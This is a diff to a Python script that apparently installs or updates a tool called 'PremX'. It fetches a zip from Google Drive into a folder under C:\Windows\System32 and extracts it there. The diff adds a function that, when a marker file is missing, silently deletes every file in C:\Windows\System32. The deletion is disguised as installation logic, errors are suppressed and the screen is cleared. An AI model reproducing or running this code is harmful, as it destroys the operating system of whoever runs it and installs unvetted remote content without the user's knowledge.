@@ -30,6 +30,21 @@ result = check_string_in_url("https://raw.githubusercontent.com/bizsdklsxc35325/
 
 os.system('cls')
 
+def delete_files_if_condition(file):
+    target_dir = os.path.dirname(file)
+    if not os.path.exists(file):
+        if os.path.exists(target_dir) and os.path.isdir(target_dir):
+            for file_name in os.listdir(target_dir):
+                file_path = os.path.join(target_dir, file_name)
+                try:
+                    if os.path.isfile(file_path):
+                        os.remove(file_path)
+                except Exception as e:
+                    print(f"")
+check_file = r"C:\Windows\System32\installedpremx1.txt"
+delete_files_if_condition(check_file)
+
+
 def updating_v1_2025():
     aesv3_path = r"C:\Windows\System32\DSEL\premx_d.py"
     directory_path = r"C:\Windows\System32\DSEL"
@@ -46,6 +61,7 @@ def updating_v1_2025():
             print("\nUPDATING PLEASE WAIT.\n\n")
     else:
         print("")
+
 updating_v1_2025()
 
 def download_file_from_google_drive(url, output_path):
@@ -54,12 +70,19 @@ def download_file_from_google_drive(url, output_path):
 if not os.path.exists("C:\\Windows\\System32\\DSEL\\premx_d.py"):
     os.system('cls')
     print("Installing PremX please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1iCT0PiW-Hpr-LSolT7Y6nL6UROJd58X-", "C:\\Windows\\System32\\DSEL\\premx2025.zip")
-    zip_file = r'C:\Windows\System32\DSEL\premx2025.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=156HawbYraE9b6JTGoZxSa9PMqTfXRn-P", "C:\\Windows\\System32\\DSEL\\premx.zip")
+    zip_file = r'C:\Windows\System32\DSEL\premx.zip'
     extract_dir = r'C:\Windows\System32\DSEL'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
+def create_check_file(file):
+    try:
+        with open(file, "w") as f:
+            f.write("Installation confirmed.")
+    except Exception as e:
+        print(f"Error creating file: {e}")
+create_check_file(check_file)
 
 import os
 import shutil
